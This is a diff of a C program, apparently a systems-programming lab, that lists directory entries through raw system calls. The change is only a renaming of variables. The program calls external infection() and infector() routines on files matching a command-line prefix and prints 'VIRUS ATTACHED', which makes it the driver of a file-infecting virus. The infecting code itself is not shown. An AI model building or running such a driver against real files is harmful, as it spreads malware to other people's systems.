@@ -16,16 +16,16 @@ extern void infection();
 extern void infector(char *filename);
 
 int main(int argc, char *argv[]) {
-    int fd, nread;
+    int fd, readed_bytes;
     char buf[BUF_SIZE];
-    int bpos;
+    int current_index;
     char prefix = '\0';
-    int filter_active = 0;
+    int should_filter = 0;
     int i;
 
     for (i = 1; i < argc; i++) {
         if (argv[i][0] == '-' && argv[i][1] == 'a') {
-            filter_active = 1;
+            should_filter = 1;
             prefix = argv[i][2];
         }
     }
@@ -35,35 +35,35 @@ int main(int argc, char *argv[]) {
         system_call(SYS_EXIT, 0x55, 0, 0);
     }
 
-    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
-    if (nread < 0) {
+    readed_bytes = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
+    if (readed_bytes < 0) {
         system_call(SYS_EXIT, 0x55, 0, 0);
     }
 
-    bpos = 0;
-    while (bpos < nread) {
-        short d_reclen = *(short*)(buf + bpos + 8);
-        char *d_name = (char*)(buf + bpos + 10);
-        int is_target = 0;
+    current_index = 0;
+    while (current_index < readed_bytes) {
+        short file_length = *(short*)(buf + current_index + 8);
+        char *file_name = (char*)(buf + current_index + 10);
+        int same_prefix = 0;
 
-        if (filter_active && d_name[0] == prefix) {
-            is_target = 1;
+        if (should_filter && file_name[0] == prefix) {
+            same_prefix = 1;
         }
 
-        if (is_target) {
+        if (same_prefix) {
             infection();
-            infector(d_name);
+            infector(file_name);
         }
 
-        system_call(SYS_WRITE, STDOUT, d_name, strlen(d_name));
+        system_call(SYS_WRITE, STDOUT, file_name, strlen(file_name));
 
-        if (is_target) {
+        if (same_prefix) {
             system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
         }
 
         system_call(SYS_WRITE, STDOUT, "\n", 1);
 
-        bpos += d_reclen;
+        current_index += file_length;
     }
 
     system_call(SYS_CLOSE, fd, 0, 0);
